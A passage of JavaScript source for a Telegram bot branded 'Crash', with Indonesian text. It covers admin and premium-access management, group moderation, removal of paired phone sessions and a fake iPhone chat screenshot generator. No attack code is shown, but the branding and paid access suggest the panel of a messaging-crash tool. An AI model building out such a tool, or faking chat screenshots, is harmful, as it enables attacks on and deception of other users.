χ-νуяℓєѕ 𝕮яαѕн - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎 ⚡
━━━━━━━━━━━━━━━━━━━━
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙗𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙙𝙞𝙝𝙖𝙥𝙪𝙨
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
⸙ 𝙖𝙘𝙘𝙚𝙨 𝙙𝙞𝙘𝙖𝙗𝙪𝙩 ⎋
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘼𝙠𝙨𝙚𝙨 𝙊𝙬𝙣𝙚𝙧 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝘾𝙖𝙗𝙪𝙩 ⎙");
});


// ========== NO ==========
bot.action("cancel_delowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝘾𝘼𝙉𝘾𝙀𝙇 ⎋
━━━━━━━━━━━━━━━
⸙ 𝙥𝙧𝙤𝙨𝙚𝙨 𝙙𝙞𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙩𝙞𝙙𝙖𝙠 𝙙𝙞𝙝𝙖𝙥𝙪𝙨
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘾𝙖𝙣𝙘𝙚𝙡𝙚𝙙 ❌");
});
// ========== COMMAND /addadmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("addadmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI ADDADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/addadmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/addadmin` sambil reply\n" +
      "👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (adminList.includes(targetUserId)) {
    return ctx.reply(
      `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ⚠️ *SUDAH ADMIN* ⚠️\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 Sudah memiliki akses admin.\n` +
      `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Tambahkan admin
  addAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🎉 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DITAMBAHKAN* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🎉 Selamat! User sekarang memiliki\n` +
    `┇    akses penuh sebagai admin!\n` +
    `┇\n` +
    `┇ 📌 Akses: *Semua command admin*\n` +
    `🎉 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User dapat menggunakan semua fitur admin sekarang!_`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /addprem (DENGAN TAMPILAN MENARIK) ==========
bot.command("addprem", async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply("🪧 Format: /addprem <user_id> atau reply chat user");
  }

  if (premiumUsers.includes(targetUserId)) {
    return ctx.reply(`User ${targetUserId} sudah menjadi akses premium.`);
  }

  // 🔥 MINIMAL UI (FOKUS BUTTON)
  await ctx.reply(`Apakah target id sudah benar ? Jika benar pilih durasi premium untuk target ID: ${targetUserId}`, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "30 HARI", callback_data: `prem_30_${targetUserId}`, style: "danger" },
          { text: "90 HARI", callback_data: `prem_90_${targetUserId}`, style: "success" },
          { text: "120 HARI", callback_data: `prem_120_${targetUserId}`, style: "primary" }
        ],
        [
          { text: "❌ CANCEL ACTION", callback_data: "prem_cancel", style: "success" }
        ]
      ]
    }
  });
});
// ========= ACTION =========
bot.action(/prem_.+/, async (ctx) => {
  const data = ctx.match[0];

  if (data === "prem_cancel") {
    await ctx.deleteMessage().catch(() => {});
    return;
  }

  const [_, duration, userId] = data.split("_");

  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }

  await ctx.editMessageText(
    `✅ Akses premium berhasil di Aktifkan\nUser: ${userId}\nDurasi: ${duration} hari`
  ).catch(() => {});
});

// ========== COMMAND /deladmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("deladmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/deladmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/deladmin` sambil reply\n" +
      "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user ada di daftar admin
  if (!adminList.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN ADMIN* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus admin
  removeAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses admin lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses admin telah dicabut.\n` +
    `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /delprem (FIX NO ERROR & CLEAN) ==========
bot.command("delprem", checkAdmin, async (ctx) => {
  let targetUserId;

  // Ambil target dari reply atau args
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  // Jika tidak ada target
  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━┓
✨  CARA PAKAI COMMAND DELPREMIUM
━━━━━━━━━━━━━━━━━━━━━━━
📌 Contoh:
/delprem 1113570863

📌 Atau reply user:
/delprem (reply pesan)
💎 ┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Jika bukan premium
  if (!premiumUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
⚠️ ┏━━━━━━━━━━━━━━━━━━┓
❌ USER BUKAN PREMIUM
━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

User ini tidak terdaftar premium sebagai
akses premium !
⚠️ ┗━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus dari premium
  premiumUsers = premiumUsers.filter(id => id !== targetUserId);
  saveJSON(premiumFile, premiumUsers);

  // Sukses hapus
  await ctx.reply(
`
\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
✨  PREMIUM BERHASIL DIHAPUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

🚫 Akses premium dicabut
📌 Sekarang user tidak memiliki akses
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /list (ULTRA KECE) ==========
bot.command("list", checkAdmin, async (ctx) => {
  await ctx.reply(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== PREMIUM ==========
bot.action("show_premium", async (ctx) => {
  if (premiumUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙪𝙨𝙚𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢
\`\`\`
`,
      backBtn()
    );
  }

  let text = premiumUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡 𝙥𝙧𝙚𝙢𝙞𝙪𝙢: ${premiumUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== ADMIN ==========
bot.action("show_admin", async (ctx) => {
  if (adminList.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\`
`,
      backBtn()
    );
  }

  let text = adminList
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${adminList.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== OWNER ==========
bot.action("show_owner", async (ctx) => {
  if (ownerUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙊𝙒𝙉𝙀𝙍 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙤𝙬𝙣𝙚𝙧
\`\`\`
`,
      backBtn()
    );
  }

  let text = ownerUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${ownerUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== BACK ==========
bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON TEMPLATE ==========
function backBtn() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "◀️ BACK", callback_data: "list_back", style: "danger" }]
      ]
    }
  };
}

const startTime = Date.now();

bot.command("cekbot", async (ctx) => {
  try {
    const msg = await ctx.reply("🔄 initializing...");

    const steps = [
      "10% ⟩ checking panel...",
      "20% ⟩ loading cpu...",
      "30% ⟩ validating system...",
      "40% ⟩ checking connection...",
      "50% ⟩ syncing data...",
      "60% ⟩ scanning modules...",
      "70% ⟩ verifying security...",
      "80% ⟩ optimizing response...",
      "90% ⟩ finalizing...",
      "100% ⟩ completed ✔"
    ];

    for (let step of steps) {
      await new Promise(r => setTimeout(r, 350));

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        `🤖 <b>χ-νуяℓєѕ 𝕮яαѕн SYSTEM CHECK</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    // uptime
    const uptime = Date.now() - startTime;

    const d = Math.floor(uptime / (1000 * 60 * 60 * 24));
    const h = Math.floor((uptime / (1000 * 60 * 60)) % 24);
    const m = Math.floor((uptime / (1000 * 60)) % 60);
    const s = Math.floor((uptime / 1000) % 60);

    const uptimeFormat = `${d}d ${h}h ${m}m ${s}s`;

    // ping
    const ping = Date.now() - (ctx.message.date * 1000);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>
🤖 <b>INFORMATION RUNNING</b>
━━━━━━━━━━━━━━━
┃ ⚡ Status : <b>ONLINE</b>
┃ ⏱️ Uptime : <code>${uptimeFormat}</code>
┃ 📡 Ping   : <code>${ping} ms</code>
┗━━━━━━━━━━━━━━━
</blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("TERJADI ERROR APDS COMMAND /cekbot:", err);
  }
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("infopanel", async (ctx) => {
  try {
    await ctx.reply("⎙ Mengambil informasi sistem panel...");

    // RAM
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam =
      (totalRam - os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const ramUsage = ((usedRam / totalRam) * 100).toFixed(2);

    // CPU
    const cpu = os.cpus()[0];
    const model = cpu.model;
    const core = os.cpus().length;

    // Load Average (1 minute)
    const load = os.loadavg()[0].toFixed(2);

    // Uptime
    const uptimeSeconds = os.uptime();
    const uptimeJam = Math.floor(uptimeSeconds / 3600);
    const uptimeMenit = Math.floor((uptimeSeconds % 3600) / 60);

    // Node version
    const nodev = process.version;

    const text = `
⎙ *Informasi Panel / Server*
──────────────────────────────

💾 *Memory (RAM)*
• Total: *${totalRam} GB*
• Terpakai: *${usedRam} GB*
• Tersisa: *${freeRam} GB*
• Penggunaan: *${ramUsage}%*

⚙️ *Processor*
• Model: *${model}*
• Core: *${core}*
• Beban: *${load}*

🕒 *Uptime:* ${uptimeJam} jam ${uptimeMenit} menit
🌐 *Platform:* ${os.platform().toUpperCase()}
🧩 *Node.js:* ${nodev}
──────────────────────────────

🛰️ *Status:* Online & Stabil
`;

    ctx.reply(text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil informasi sistem.");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("delpair", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply(
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /delpair 628xxxx");
  }

  const botNumber = args[1].replace(/[^0-9]/g, "");

  let statusMessage = await ctx.reply(
`\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн — 𝙇𝙊𝘼𝘿𝙄𝙉𝙂
ID: ${botNumber}
Status: Executing...\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);

    // 🔥 FIX UTAMA (ANTI BOT ZOMBIE)
    if (sock) {
      try {
        await sock.logout();
      } catch (e) {}

      try {
        sock.end?.();         // matiin koneksi
        sock.ws?.close?.();   // force close websocket
      } catch (e) {}

      sessions.delete(botNumber);
    }

    // 🔥 HAPUS FOLDER SESSION
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // 🔥 UPDATE FILE SESSION
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updatedNumbers = activeNumbers.filter(
        (num) => num !== botNumber
      );
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн — 𝙎𝙐𝘾𝘾𝙀𝙎𝙎
ID: ${botNumber}
Status: Berhasil di hapus!\`\`\`
`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн — 𝙀𝙍𝙍𝙊𝙍
ID: ${botNumber}
Status: ${error.message}\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("restart", async (ctx) => {
  try {
    const teks = `
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔
━━━━━━━━━━━━━━━━━━━
⎌ 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝙊𝙩𝙤𝙢𝙖𝙩𝙞𝙨 𝙋𝙖𝙙𝙖 𝙋𝙖𝙣𝙚𝙡 𝘽𝙖𝙣𝙜... 𝙈𝙤𝙝𝙤𝙣 𝙏𝙪𝙣𝙜𝙜𝙪 𝙎𝙚𝙟𝙚𝙣𝙖𝙠.....
\`\`\`
    `;

    await ctx.reply(teks, { parse_mode: "Markdown" });

    setTimeout(() => {
      process.exit(0);
    }, 2500);

  } catch (err) {
    console.log(err);
    ctx.reply("Gagal restart. Masalah pada Internal Server.");
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});

bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By χ-νуяℓєѕ 𝕮яαѕн Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 
// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
